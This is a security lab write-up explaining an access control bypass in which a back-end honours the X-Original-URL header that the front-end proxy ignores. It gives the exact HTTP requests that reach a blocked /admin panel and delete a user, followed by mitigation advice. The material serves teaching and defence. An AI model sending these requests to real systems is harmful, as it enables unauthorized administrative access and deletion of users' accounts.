# Lab — Access Control Bypass via `X-Original-URL` Header

## Vulnerability Overview

| Property | Detail |
|---|---|
| **Type** | Access Control Bypass / Header Injection |
| **Header Abused** | `X-Original-URL` |
| **Target** | `/admin` panel (unauthenticated) |
| **Root Cause** | Back-end framework honours `X-Original-URL`; front-end proxy only checks the real request path |

---

## How It Works

Some back-end frameworks (e.g. **Symfony**, **Zend**) read the `X-Original-URL` header and use it as the effective request path, overriding whatever URL was actually requested. When a front-end reverse proxy (e.g. Nginx) blocks access to `/admin` by inspecting only the real URL, an attacker can set `X-Original-URL: /admin` and the back-end will process the admin route — completely bypassing the proxy's ACL.

```
Client ──► Nginx (blocks /admin) ──► App server (reads X-Original-URL: /admin ✓)
```

---

## Step-by-Step Exploitation

### Step 1 — Confirm the Front-End Block

Send a normal request to `/admin`:

```http
GET /admin HTTP/1.1
Host: <lab-host>
```

**Result:** A plain, minimal "blocked" response — indicating the rejection comes from the **front-end proxy**, not the application.

---

### Step 2 — Probe Back-End Header Processing

Send a request to `/` with an intentionally invalid override path:

```http
GET / HTTP/1.1
Host: <lab-host>
X-Original-URL: /invalid
```

**Result:** A `404 Not Found` from the **application**. This confirms the back-end is routing based on `X-Original-URL`, not the real path.

---

### Step 3 — Access the Admin Panel

Replace `/invalid` with `/admin`:

```http
GET / HTTP/1.1
Host: <lab-host>
X-Original-URL: /admin
```

**Result:** The admin panel loads successfully. The front-end proxy only saw `GET /` and allowed it through.

---

### Step 4 — Delete User `carlos`

The delete action requires a `username` query parameter. Attach it to the **real URL** (the part the proxy sees), and set the override path to `/admin/delete`:

```http
GET /?username=carlos HTTP/1.1
Host: <lab-host>
X-Original-URL: /admin/delete
```

> **Why `?username=carlos` goes on the real URL:** The back-end framework substitutes only the *path* from `X-Original-URL`. Query string parameters are still read from the original request line.

**Result:** User `carlos` is deleted — lab solved. ✓

---

## Summary of Requests

| Step | Real URL | `X-Original-URL` | Purpose |
|------|----------|------------------|---------|
| 1 | `/admin` | — | Confirm front-end block |
| 2 | `/` | `/invalid` | Confirm back-end processes header |
| 3 | `/` | `/admin` | Access admin panel |
| 4 | `/?username=carlos` | `/admin/delete` | Delete target user |

---

## Mitigation

- **Strip untrusted headers at the edge.** The reverse proxy should remove `X-Original-URL` (and similar: `X-Rewrite-URL`, `X-Forwarded-URL`) from all incoming requests before they reach the back-end.
- **Apply access controls at the back-end**, not only at the proxy layer — defence in depth.
- **Allowlist internal headers** if override headers are genuinely needed for internal routing; reject them from external traffic.